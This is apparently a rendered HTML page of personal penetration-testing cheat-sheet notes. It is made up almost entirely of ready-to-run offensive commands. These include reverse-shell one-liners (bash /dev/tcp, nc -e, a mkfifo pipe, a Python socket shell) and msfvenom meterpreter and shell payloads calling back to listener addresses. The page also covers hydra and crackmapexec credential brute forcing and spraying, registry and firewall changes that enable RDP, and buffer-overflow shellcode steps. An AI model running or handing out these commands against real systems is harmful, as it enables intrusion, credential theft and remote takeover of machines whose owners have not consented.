I"w+<h2 id="public-exploits">Public exploits</h2>
<p>Links:</p>
<ul>
  <li><a href="www.exploit-db.com">Exploitdb</a></li>
  <li><a href="packetstormysecurity.com">packetstormysecurity</a></li>
  <li><a href="securityfocus.com">securityfocus</a></li>
  <li><a href="cve.mitre.org/cve/search_cve_list.html">CVE Mitre</a></li>
</ul>

<h3 id="searchsploit">Searchsploit</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit webmin
searchsploit webmin —exclude<span class="o">=</span><span class="s2">"php|Dans"</span>
searchsploit <span class="nt">-e</span> webmin :
searchsploit ipfire —id <span class="nt">-m</span> 42149 
</code></pre></div></div>

<h3 id="important"><strong>Important!</strong></h3>
<ul>
  <li><strong>Always check the payloads.</strong></li>
  <li>Check the dependencies libs,dll’s…</li>
  <li>Always test before execute in the target.</li>
</ul>

<h2 id="wordlists">Wordlists</h2>
<ul>
  <li><a href="https://github.com/danielmiessler/SecLists">Seclist</a></li>
  <li><a href="https://wordlists.assetnote.io/">assetnote</a></li>
</ul>

<h2 id="reverse-shell">Reverse shell</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 4444 <span class="c"># Open port</span>

bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/172.100.50.0/4444 0&gt;&amp;1
nc <span class="nt">-e</span> /bin/bash 172.100.50.0 4444
/bin/sh | nc 127.0.0.1 5555
<span class="nb">rm</span> /tmp/f<span class="p">;</span><span class="nb">mkfifo</span> /tmp/f<span class="p">;</span><span class="nb">cat</span> /tmp/f|/bin/sh <span class="nt">-i</span> 2&gt;&amp;1|nc 172.100.50.0 4444 <span class="o">&gt;</span>/tmp/f <span class="c"># OpenBSD</span>

python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.20.1.21",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span> 

msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>172.100.50.0 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> exe <span class="o">&gt;</span> reverse.exe <span class="c"># Meterpreter</span>
msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="s2">"172.100.50.0"</span> <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> asp <span class="o">&gt;</span> shell.asp
msfvenom <span class="nt">-p</span> java/jsp_shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span><span class="s2">"172.100.50.0"</span> <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> raw <span class="o">&gt;</span> shell.jsp
msfvenom <span class="nt">-p</span> php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>172.100.50.0 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> raw <span class="nt">-o</span> shell.php

python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/sh")'</span> <span class="c"># Interactive shell</span>
perl <span class="nt">-e</span> <span class="s1">'exec "/bin/sh";'</span>
ruby: <span class="nb">exec</span> <span class="s2">"/bin/sh"</span>
</code></pre></div></div>

<h3 id="mutations">Mutations</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john —wordlist<span class="o">=</span>file —rules —stdout <span class="o">&gt;</span> mutacao <span class="c"># New wordlist with variations of the first</span>
nano /etc/john/john.conf → wordlist mode rules <span class="c"># Mutations personalized rules</span>
    <span class="c"># ^[0-9] : 0 to 9 in the begin</span>
    <span class="c"># $[0-9] : 0 to 9 in te final</span>
    <span class="c"># $[@]$[0-9]$[0-9] : Add @ + 2 numbers in the end.</span>

cewl google.com <span class="nt">-m</span> 7 <span class="c"># Find every word in the page with the lenght</span>

crunch 10 10 <span class="nt">-t</span> rogerio^%% <span class="nt">-o</span> wordlist <span class="c"># List based in patterns</span>
    <span class="c"># % : Numbers.</span>
    <span class="c"># ^ : Special character.</span>
    <span class="c"># @ : Lower case character.</span>
    <span class="c"># , : Capital character.</span>
</code></pre></div></div>

<h3 id="key-space-brute-force">Key space brute force</h3>
<p>All the possible variations.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crunch 4 4 0123456789 <span class="nt">-o</span> pin <span class="c"># All combinations with 4 digits.</span>

crunch 6 6 <span class="nt">-f</span> charset.lst numeric <span class="nt">-o</span> pin <span class="c"># Use the crunch numeric pattern</span>
</code></pre></div></div>

<h2 id="brute-force">Brute force</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-v</span> <span class="nt">-l</span> rogerio <span class="nt">-p</span> admin 172.16.1.60 sbm <span class="c">#SMB</span>
hydra <span class="nt">-v</span> <span class="nt">-L</span> users.txt <span class="nt">-p</span> pass.txt 172.16.1.60 sbm 
hydra <span class="nt">-v</span> <span class="nt">-L</span> users.txt <span class="nt">-P</span> pass.txt <span class="nt">-M</span> alvos.txt sbm
hydra <span class="nt">-L</span> rdp_users.txt <span class="nt">-P</span> rdp_pass.txt rdp://172.16.1.188 <span class="nt">-I</span> <span class="nt">-t</span> 1 <span class="c">#RDP</span>
hydra <span class="nt">-v</span> L users.txt <span class="nt">-p</span> admin 172.16.1.5 ssh
hydra <span class="nt">-v</span> <span class="nt">-L</span> users.txt <span class="nt">-P</span> password 172.16.1.5 <span class="nt">-t</span> 1 <span class="nt">-W</span> 5
    <span class="c"># -s : Set port.</span>
    <span class="c"># -t : Threads.</span>
    <span class="c"># -W : Sleep time beetwen tasks.</span>
</code></pre></div></div>
<h3 id="winrm"><strong>WinRM</strong></h3>
<p>Link:</p>
<ul>
  <li>[winrm-penetration-testing]https://www.hackingarticles.in/winrm-penetration-testing/
Windows Remote Management, is a command-line tool that enables administrators to remotely execute the CMD.exe commands using the WS-Management protocol. Port 5985/HTTP, 5986/HTTPS.
Evil-WinRM
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 172.16.1.140 <span class="nt">-u</span> user <span class="nt">-p</span> password
</code></pre></div>    </div>
  </li>
</ul>

<h3 id="rdp">RDP</h3>
<p>Active or disable rdp in windows</p>
<ul>
  <li>Active
    <ul>
      <li>reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 0 /f</li>
      <li>netsh advfirewall firewall set rule group=”remote desktop” new enable=Yes</li>
    </ul>
  </li>
  <li>Disable
    <ul>
      <li>reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fDenyTSConnections /t REG_DWORD /d 1 /f</li>
      <li>netsh advfirewall firewall set rule group=”remote desktop” new enable=No</li>
    </ul>
  </li>
</ul>

<h3 id="crackmaexec">crackmaexec</h3>
<p>Swiss knife for pentest</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec &lt;protocol&gt; &lt;target<span class="o">(</span>s<span class="o">)&gt;</span> <span class="nt">-u</span> username <span class="nt">-p</span> password

crackmaexec smb 172.16.1.0/24 <span class="nt">-u</span> jonh <span class="nt">-p</span> <span class="s1">'jonh@10'</span> <span class="c"># Scan the network to the test all logins</span>
crackmaexec smb 172.16.1.60 <span class="nt">-u</span> jonh <span class="nt">-p</span> <span class="s1">'jonh@10'</span>  <span class="nt">-x</span> <span class="s1">'whoami'</span> <span class="c"># Execute this command</span>

crackmaexec ldap 192.168.1.0/24 <span class="nt">-u</span> user <span class="nt">-p</span> <span class="s1">'jonh@10'</span>
crackmaexec ldap 192.168.1.0/24 <span class="nt">-u</span> user <span class="nt">-H</span> hashexemple

crackmaexec mssql 192.168.1.0/24 <span class="nt">-u</span> userfile <span class="nt">-p</span> passwordfile <span class="nt">--no-bruteforce</span>

crackmaexec winrm 192.168.1.0/24 <span class="nt">-u</span> userfile <span class="nt">-p</span> passwordfile <span class="nt">--no-bruteforce</span>
</code></pre></div></div>

<h2 id="buffer-overflow">Buffer overflow</h2>

<h3 id="pattern-offset">Pattern offset</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/bin/msf-patter_create <span class="nt">-l</span> 2200 <span class="c"># Create pattern</span>
/usr/bin/msf-pattern_offset <span class="nt">-l</span> 2200 <span class="nt">-q</span> 43396f43 <span class="c"># Find EIP overwrite</span>
</code></pre></div></div>
<h3 id="shellcode">Shellcode</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>192.168.0.16 <span class="nv">lport</span><span class="o">=</span>443 <span class="nv">exitfunc</span><span class="o">=</span>thread <span class="nt">-b</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">00"</span> <span class="nt">-f</span> c
</code></pre></div></div>

<h3 id="gdblinux">GDB/Linux</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb <span class="nt">-q</span> ./file
info functions               <span class="c"># Show functions</span>
<span class="nb">set </span>disassembly-flavor intel <span class="c"># Set flavor</span>
disas main                   <span class="c"># Dissasembly specific funtion</span>
b<span class="k">*</span> 0x5655621f                <span class="c"># Breakpoint</span>
run &lt; &lt;<span class="o">(</span>python <span class="nt">-c</span> <span class="s1">'print "A" * 200'</span><span class="o">)</span> <span class="c"># Input data</span>
i r                          <span class="c"># Show registers(esp,eip,...)</span>
x/16xw <span class="nv">$esp</span>                  <span class="c"># Specific memory zone</span>
<span class="nb">break </span>main                   <span class="c"># Brakpoint in the funtion</span>
<span class="nb">set</span> <span class="nv">$eip</span> <span class="o">=</span> 0x56556982        <span class="c"># Jump to specific function/zone</span>
python <span class="nt">-c</span> <span class="s1">'print "A" * 136 + "BBBB" + "\x70\x62\x55\x56"'</span> | ./file <span class="c"># Send a specific number, that will allow overwrite and redirect the EIP.</span>
</code></pre></div></div>
:ET